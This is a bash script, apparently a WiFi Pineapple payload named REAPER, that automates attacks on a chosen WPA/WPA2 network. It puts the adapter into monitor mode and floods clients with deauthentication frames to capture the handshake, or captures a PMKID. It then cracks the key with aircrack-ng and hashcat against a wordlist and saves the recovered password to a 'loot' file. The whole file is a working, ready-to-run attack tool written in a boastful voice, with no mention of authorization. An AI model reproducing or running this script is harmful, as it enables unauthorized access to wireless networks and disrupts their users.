#!/bin/bash
#═══════════════════════════════════════════════════════════════════════════════
# REAPER - Rapid Extraction & Automated Password/Encryption Recovery
# Developed by: bad-antics
# 
# Automated WPA/WPA2 cracking pipeline - scan, capture, crack, report
#═══════════════════════════════════════════════════════════════════════════════

source /mmc/nullsec/lib/nullsec-scanner.sh 2>/dev/null

LOOT_DIR="/mmc/nullsec/reaper"
WORDLIST="/mmc/nullsec/wordlists/master.txt"
mkdir -p "$LOOT_DIR"

PROMPT "    ╦═╗╔═╗╔═╗╔═╗╔═╗╦═╗
    ╠╦╝║╣ ╠═╣╠═╝║╣ ╠╦╝
    ╩╚═╚═╝╩ ╩╩  ╚═╝╩╚═
━━━━━━━━━━━━━━━━━━━━━━━━━
Automated Hash Harvester

Full attack pipeline:
Scan → Target → Capture
→ Crack → Victory

The password WILL fall.
━━━━━━━━━━━━━━━━━━━━━━━━━
Developed by: bad-antics"

PROMPT "REAPER METHODS:

1. Handshake Harvest
   (WPA/WPA2 4-way)

2. PMKID Reap
   (Clientless attack)

3. Full Assault
   (Both methods)

Choose your scythe..."

METHOD=$(NUMBER_PICKER "Method (1-3):" 3)

# Select target
nullsec_select_target
[ -z "$SELECTED_BSSID" ] && { ERROR_DIALOG "No target!"; exit 1; }

CONFIRMATION_DIALOG "REAP TARGET:
$SELECTED_SSID
$SELECTED_BSSID
Channel: $SELECTED_CHANNEL

Begin the harvest?"
[ $? -ne 0 ] && exit 0

INTERFACE="wlan0"
airmon-ng check kill 2>/dev/null
airmon-ng start $INTERFACE >/dev/null 2>&1
MON_IF="${INTERFACE}mon"
[ ! -d "/sys/class/net/$MON_IF" ] && MON_IF="$INTERFACE"

iwconfig $MON_IF channel $SELECTED_CHANNEL 2>/dev/null

LOOT_FILE="$LOOT_DIR/reaper_$(date +%Y%m%d_%H%M%S).txt"
CAPTURE_FILE="$LOOT_DIR/capture_$(date +%Y%m%d_%H%M%S)"

cat > "$LOOT_FILE" << EOF
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 REAPER - Harvest Report
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Target: $SELECTED_SSID ($SELECTED_BSSID)
 Channel: $SELECTED_CHANNEL
 Method: $METHOD
 Started: $(date)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 NullSec Pineapple Suite | Developed by: bad-antics
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

EOF

HANDSHAKE_CAPTURED=0
PMKID_CAPTURED=0
PASSWORD=""

harvest_handshake() {
    LOG "Harvesting handshake..."
    SPINNER_START "Deauthing & capturing..."
    
    # Start capture
    timeout 120 airodump-ng --bssid $SELECTED_BSSID -c $SELECTED_CHANNEL -w "$CAPTURE_FILE" $MON_IF 2>/dev/null &
    DUMP_PID=$!
    sleep 5
    
    # Deauth to force reconnection
    for i in {1..5}; do
        aireplay-ng --deauth 10 -a $SELECTED_BSSID $MON_IF 2>/dev/null
        sleep 5
        
        # Check for handshake
        if aircrack-ng "${CAPTURE_FILE}-01.cap" 2>/dev/null | grep -q "1 handshake"; then
            HANDSHAKE_CAPTURED=1
            echo "[$(date)] HANDSHAKE CAPTURED!" >> "$LOOT_FILE"
            kill $DUMP_PID 2>/dev/null
            break
        fi
    done
    
    SPINNER_STOP
}

harvest_pmkid() {
    LOG "Harvesting PMKID..."
    SPINNER_START "Waiting for PMKID..."
    
    if command -v hcxdumptool &>/dev/null; then
        timeout 60 hcxdumptool -i $MON_IF -o "${CAPTURE_FILE}.pcapng" --filterlist_ap=$SELECTED_BSSID --filtermode=2 2>/dev/null
        
        if [ -f "${CAPTURE_FILE}.pcapng" ] && command -v hcxpcapngtool &>/dev/null; then
            hcxpcapngtool -o "${CAPTURE_FILE}.hash" "${CAPTURE_FILE}.pcapng" 2>/dev/null
            [ -s "${CAPTURE_FILE}.hash" ] && PMKID_CAPTURED=1
        fi
    else
        # Fallback to tcpdump method
        timeout 60 tcpdump -i $MON_IF -w "${CAPTURE_FILE}_pmkid.cap" "ether host $SELECTED_BSSID" 2>/dev/null
    fi
    
    [ $PMKID_CAPTURED -eq 1 ] && echo "[$(date)] PMKID CAPTURED!" >> "$LOOT_FILE"
    
    SPINNER_STOP
}

crack_capture() {
    [ ! -f "$WORDLIST" ] && {
        echo "[$(date)] No wordlist found at $WORDLIST" >> "$LOOT_FILE"
        return
    }
    
    LOG "Cracking..."
    SPINNER_START "Running dictionary attack..."
    
    if [ $HANDSHAKE_CAPTURED -eq 1 ]; then
        RESULT=$(aircrack-ng -w "$WORDLIST" -b $SELECTED_BSSID "${CAPTURE_FILE}-01.cap" 2>/dev/null)
        if echo "$RESULT" | grep -q "KEY FOUND"; then
            PASSWORD=$(echo "$RESULT" | grep "KEY FOUND" | sed 's/.*\[ //' | sed 's/ \].*//')
        fi
    fi
    
    if [ $PMKID_CAPTURED -eq 1 ] && command -v hashcat &>/dev/null; then
        hashcat -m 22000 "${CAPTURE_FILE}.hash" "$WORDLIST" --quiet 2>/dev/null
        PASSWORD=$(hashcat -m 22000 "${CAPTURE_FILE}.hash" --show 2>/dev/null | cut -d: -f2)
    fi
    
    SPINNER_STOP
}

case $METHOD in
    1) harvest_handshake ;;
    2) harvest_pmkid ;;
    3)
        harvest_pmkid
        [ $PMKID_CAPTURED -eq 0 ] && harvest_handshake
        ;;
esac

# Attempt crack if we got something
[ $HANDSHAKE_CAPTURED -eq 1 ] || [ $PMKID_CAPTURED -eq 1 ] && crack_capture

# Results
cat >> "$LOOT_FILE" << EOF

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 HARVEST RESULTS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Target: $SELECTED_SSID
 Handshake: $([ $HANDSHAKE_CAPTURED -eq 1 ] && echo "CAPTURED" || echo "No")
 PMKID: $([ $PMKID_CAPTURED -eq 1 ] && echo "CAPTURED" || echo "No")
 Password: ${PASSWORD:-Not cracked}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 NullSec Pineapple Suite | Developed by: bad-antics
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
EOF

# Cleanup
airmon-ng stop $MON_IF 2>/dev/null

if [ -n "$PASSWORD" ]; then
    PROMPT "  ☠ HARVEST COMPLETE ☠
━━━━━━━━━━━━━━━━━━━━━━━━━
TARGET REAPED!

SSID: $SELECTED_SSID
PASSWORD: $PASSWORD

Victory is yours.
━━━━━━━━━━━━━━━━━━━━━━━━━
Developed by: bad-antics"
else
    PROMPT "REAPER REPORT
━━━━━━━━━━━━━━━━━━━━━━━━━
Harvest: $SELECTED_SSID

Handshake: $([ $HANDSHAKE_CAPTURED -eq 1 ] && echo "YES" || echo "NO")
PMKID: $([ $PMKID_CAPTURED -eq 1 ] && echo "YES" || echo "NO")

Password not in wordlist
or capture incomplete.

Hash saved for offline
cracking.
━━━━━━━━━━━━━━━━━━━━━━━━━
Developed by: bad-antics"
fi
